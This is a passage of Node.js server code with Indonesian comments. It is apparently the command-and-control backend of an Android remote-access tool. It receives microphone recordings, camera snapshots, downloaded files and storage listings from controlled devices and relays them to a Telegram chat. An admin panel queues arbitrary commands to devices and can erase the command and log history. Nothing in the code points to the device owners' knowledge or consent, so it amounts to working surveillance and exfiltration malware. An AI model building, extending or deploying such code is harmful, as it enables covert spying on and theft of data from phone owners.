                            await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
                        }
                    } else {
                        await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
                    }
                };

                if (data.type === 'audio_base64') {
                    const audioBuffer = Buffer.from(deviceResponse, 'base64');
                    await bot.telegram.sendAudio(cmd.chat_id, {
                        source: audioBuffer,
                        filename: `record_${data.id}.3gp`
                    }, { caption: `✅ <b>Respon Rekaman Suara (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
                    return res.json({ status: 'received' });
                }

                if (data.type === 'photo_base64') {
                    const imageBuffer = Buffer.from(deviceResponse, 'base64');
                    await bot.telegram.sendPhoto(cmd.chat_id, {
                        source: imageBuffer
                    }, { caption: `📸 <b>Respon Jepretan Kamera (${escapeHTML(client_id)})</b>`, parse_mode: 'HTML', ...getNavOpts() });
                    return res.json({ status: 'received' });
                }

                if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
                    const fileBuffer = Buffer.from(deviceResponse.data, 'base64');
                    await bot.telegram.sendDocument(cmd.chat_id, {
                        source: fileBuffer,
                        filename: deviceResponse.name
                    }, { caption: `✅ <b>Berhasil Mengunduh File (${escapeHTML(client_id)})</b>\n📂 Nama: ${escapeHTML(deviceResponse.name)}`, parse_mode: 'HTML', ...getNavOpts() });
                    return res.json({ status: 'received' });
                }

                if (data.type === 'ls_result' && Array.isArray(deviceResponse)) {
                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                    lsState[client_id] = {
                        path: currentPath,
                        items: deviceResponse,
                        page: 1,
                        totalPages: Math.max(1, Math.ceil(deviceResponse.length / 30))
                    };
                    await sendExplorerPage(client_id, 1, cmd.chat_id);
                    return res.json({ status: 'received' });
                }

                if (data.type === 'upload_success') {
                    await sendOrEdit(`✅ <b>File berhasil diunggah!</b>\n└ ${escapeHTML(deviceResponse)}`);
                    // Auto Refresh ls
                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                    const refreshCmdId = uuidv4().slice(0, 8);
                    await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
                        [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id]);
                    return res.json({ status: 'received' });
                }

                // PRATINJAU JSON CERDAS
                const generatePreview = (d) => {
                    let preview = '';
                    if (Array.isArray(d)) {
                        const sub = d.slice(0, 5);
                        preview = formatDeviceResponse(sub);
                        if (d.length > 5) preview += `\n  ... <i>dan ${d.length - 5} baris lainnya.</i>`;
                    } else if (typeof d === 'object' && d !== null) {
                        const keys = Object.keys(d).slice(0, 10);
                        const sub = {};
                        keys.forEach(k => sub[k] = d[k]);
                        preview = formatDeviceResponse(sub);
                        if (Object.keys(d).length > 10) preview += `\n  ... <i>dan properti lainnya.</i>`;
                    }

                    // Batasi panjang caption total 1024 char, kita batasi preview 750 saja
                    if (preview.length > 750) {
                        preview = preview.substring(0, 750) + '\n... (terpotong, lihat Dokumen JSON)';
                    }
                    return preview;
                };

                const jsonString = JSON.stringify(deviceResponse, null, 2);

                // Jika ukuran pesan melebihi limit Telegram (4096 char), kirim sebagai file JSON dengan Preview
                if (jsonString.length > 3500) {
                    const previewText = generatePreview(deviceResponse);
                    const buffer = Buffer.from(jsonString, 'utf-8');
                    await bot.telegram.sendDocument(cmd.chat_id, {
                        source: buffer,
                        filename: `response_${data.id}.json`
                    }, {
                        caption: `✅ <b>Respon Super Besar [${escapeHTML(client_id)}]:</b>\n\n<b>🔍 Pratinjau Cepat:</b>\n${previewText}\n\n<i>📂 Selengkapnya silakan buka Dokumen JSON di atas.</i>`,
                        parse_mode: 'HTML',
                        ...getNavOpts()
                    });
                    // Hapus pesan "Waiting" karena dokumen dikirim sebagai pesan baru
                    if (cmd.message_id) {
                        bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                    }
                } else {
                    const formattedDisplay = formatDeviceResponse(deviceResponse);
                    // Tambahkan pengamanan ekstra: jika formattedDisplay masih mengandung tag mencurigakan (untuk jaga-jaga)
                    const replyMessage = `✅ <b>Respon Eksekusi [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`;
                    await sendOrEdit(replyMessage);
                }
            }
        } catch (err) {
            console.error('Gagal mengirim balasan ke Telegram:', err);
        }
    }

    res.json({ status: 'received' });
});

// --- ADMIN PANEL ---
const verifyAdmin = (req) => req.cookies.admin_auth === ADMIN_PASSWORD;

app.get('/admin', (req, res) => {
    if (!verifyAdmin(req)) return res.render('login');
    res.render('index');
});

app.post('/admin/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie('admin_auth', req.body.password, { maxAge: 86400000, httpOnly: true });
        return res.redirect('/admin');
    }
    res.redirect('/admin');
});

app.post('/admin/logout', (req, res) => {
    res.clearCookie('admin_auth');
    res.redirect('/admin');
});

app.get('/admin/api/devices', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const devices = await db.all('SELECT * FROM devices');
        const now = Date.now() / 1000;

        const devicesData = devices.map(d => ({
            id: d.id,
            last_seen: d.last_seen,
            is_online: (now - d.last_seen) < 90,
            polling_mode: d.polling_mode || 'long'
        }));
        res.json({ devices: devicesData });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

// Helper function to format UTC date string to a local readable format
const formatUtcToLocal = (utcDateString) => {
    if (!utcDateString) return '-';
    // Append 'Z' to treat the string as UTC
    const date = new Date(utcDateString + 'Z');
    // Format to a readable local string (e.g., 'id-ID' for Indonesian locale)
    return date.toLocaleString('id-ID', {
        year: 'numeric',
        month: 'numeric',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false // Use 24-hour format
    });
};

app.get('/admin/api/logs', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const query = `
            SELECT 
                CAST(id AS TEXT) as id,
                'log' as type,
                COALESCE(device_id, '-') as device_id, 
                COALESCE(command_id, '-') as command_id, 
                level, 
                created_at, 
                COALESCE(SUBSTR(message, 1, 300), '') AS message_preview 
            FROM system_logs 
            WHERE command_id IS NULL
            
            UNION ALL 
            
            SELECT 
                CAST(COALESCE(l.id, c.id) AS TEXT) as id,
                CASE WHEN l.id IS NOT NULL THEN 'log' ELSE 'cmd' END as type,
                COALESCE(c.device_id, '-') as device_id, 
                COALESCE(c.id, '-') AS command_id, 
                CASE WHEN l.id IS NOT NULL THEN l.level ELSE c.status END AS level, 
                COALESCE(l.created_at, c.created_at) as created_at, 
                COALESCE(SUBSTR('Cmd: ' || c.command || ' ' || COALESCE(c.text, '') || COALESCE(' ➔ ' || l.message, ''), 1, 300), '') AS message_preview 
            FROM commands c
            LEFT JOIN system_logs l ON c.id = l.command_id
            
            ORDER BY created_at DESC LIMIT 100
        `;

        const logs = await db.all(query);

        const formattedLogs = logs.map(l => {
            let preview = l.message_preview;
            if (preview && preview.length >= 300 && l.type === 'log') {
                preview += '... [Lihat Detail untuk Full JSON/Media]';
            }
            return {
                id: l.id,
                type: l.type,
                device_id: l.device_id,
                command_id: l.command_id,
                level: l.level,
                created_at: formatUtcToLocal(l.created_at), // Apply formatting here
                message: preview
            };
        });

        let hostLogs = [];
        const stderrPath = path.join(__dirname, 'stderr.log');
        if (fs.existsSync(stderrPath)) {
            try {
                const fileContent = fs.readFileSync(stderrPath, 'utf8');
                // Pisahkan per blok unit error jika diawali path absolut, nama Error, Unhandled Rejection, atau pesan "Failed to"
                const blocks = fileContent.split(/\n(?=\/[a-zA-Z0-9_\-\/]+\.js:\d+|[a-zA-Z]+Error:|UnhandledPromiseRejection|Failed to [a-z]+)/i);

                hostLogs = blocks.map((b, idx) => {
                    const text = b.trim();
                    if (!text) return null;
                    const lines = text.split('\n');
                    let title = lines[0];

                    const errMatch = text.match(/(?:[a-zA-Z]+Error|Exception|UnhandledPromiseRejection): .+/i);
                    if (errMatch) title = errMatch[0];

                    // ID stabil berdasarkan urutan blok (ini aman jika log hanya bertambah di akhir)
                    return {
                        id: `err_${idx}`,
                        title: title.length > 150 ? title.substring(0, 150) + '...' : title,
                        full: text
                    };
                }).filter(h => h !== null).reverse().slice(0, 50);
            } catch (e) {
                hostLogs = [{ id: 'err_read', title: 'Gagal membaca stderr.log', full: e.message }];
            }
        }

        res.json({ logs: formattedLogs, hostLogs });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

app.get('/admin/api/stats', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        // Command paling sering digunakan
        const topCommands = await db.all(`
            SELECT command, COUNT(*) as count 
            FROM commands 
            GROUP BY command 
            ORDER BY count DESC 
            LIMIT 5
        `);

        // Command paling cepat response-nya (rata-rata durasi)
        // Menggunakan julianday untuk presisi yang lebih baik jika format timestamp mendukung ms
        const responseTimes = await db.all(`
            SELECT command, 
                   AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg_duration
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL
            GROUP BY command 
            ORDER BY avg_duration ASC 
            LIMIT 5
        `);

        const slowestCommands = await db.all(`
            SELECT command, 
                   AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg_duration
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL
            GROUP BY command 
            ORDER BY avg_duration DESC 
            LIMIT 10
        `);

        const turboAvgRes = await db.get(`
            SELECT AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL AND polling_mode = 'turbo'
        `);

        const normalAvgRes = await db.get(`
            SELECT AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL AND polling_mode = 'normal'
        `);

        // Statistik Status Device
        const devices = await db.all('SELECT last_seen FROM devices');
        const now = Date.now() / 1000;
        let online = 0;
        let offline = 0;
        devices.forEach(d => {
            if ((now - d.last_seen) < 90) online++;
            else offline++;
        });

        // Aktivitas Command 7 hari terakhir
        const dailyActivity = await db.all(`
            SELECT DATE(created_at) as date, COUNT(*) as count 
            FROM commands 
            WHERE created_at > DATE('now', '-7 days')
            GROUP BY DATE(created_at)
            ORDER BY date ASC
        `);

        res.json({
            topCommands,
            fastestCommands: responseTimes,
            slowestCommands,
            avgResponseTurbo: turboAvgRes?.avg || 0,
            avgResponseNormal: normalAvgRes?.avg || 0,
            deviceStatus: { online, offline },
            dailyActivity
        });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

app.get('/admin/api/log/:id', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const logId = req.params.id;
        const log = await db.get('SELECT * FROM system_logs WHERE id = ?', [logId]);
        if (!log) return res.status(404).json({ error: 'Log tidak ditemukan di database.' });

        let cmd = null;
        if (log.command_id) {
            cmd = await db.get('SELECT * FROM commands WHERE id = ?', [log.command_id]);
        }

        let parsedBody = {};
        try {
            parsedBody = JSON.parse(log.message);
        } catch (e) {
            parsedBody = { raw_data: log.message };
        }

        // Format created_at before sending
        const formattedLog = {
            ...log,
            created_at: formatUtcToLocal(log.created_at)
        };

        res.json({ log: formattedLog, parsedBody, command: cmd });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});



app.post('/admin/api/command', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const { device_id, command, text } = req.body;
        const cmdId = uuidv4().slice(0, 8);
        await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
            [cmdId, device_id, command, text || '', 'pending']);
        res.json({ status: 'success', command_id: cmdId });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

app.delete('/admin/api/device/:id', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const devId = req.params.id;
        await db.run('DELETE FROM commands WHERE device_id = ?', [devId]);
        await db.run('DELETE FROM system_logs WHERE device_id = ?', [devId]);
        await db.run('DELETE FROM devices WHERE id = ?', [devId]);
        res.json({ status: 'success', message: 'Perangkat berhasil dibersihkan dari registry.' });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

app.delete('/admin/api/logs', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        if (!db) return res.status(503).json({ error: 'Database belum siap' });

        const filterDays = parseInt(req.query.days) || 0;

        if (filterDays === 0) {
            await db.run('DELETE FROM system_logs');
            await db.run('DELETE FROM commands');
        } else {
            const timeFilter = `datetime(created_at) < datetime('now', '-${filterDays} days')`;
            await db.run(`DELETE FROM system_logs WHERE ${timeFilter}`);
            await db.run(`DELETE FROM commands WHERE ${timeFilter}`);
        }
        res.json({ status: 'success', message: 'Log sistem dan riwayat perintah berhasil dibersihkan.' });
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

app.delete('/admin/api/host-logs', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        const stderrPath = path.join(__dirname, 'stderr.log');
        if (fs.existsSync(stderrPath)) {
            fs.writeFileSync(stderrPath, '');
            res.json({ status: 'success', message: 'Log hosting (stderr.log) berhasil dikosongkan.' });
        } else {
            res.status(404).json({ error: 'File stderr.log tidak ditemukan.' });
        }
    } catch (e) {
        res.status(500).json({ error: 'Internal Server Error', details: e.message });
    }
});

// app.listen dipindahkan ke inisialisasi DB di awal file

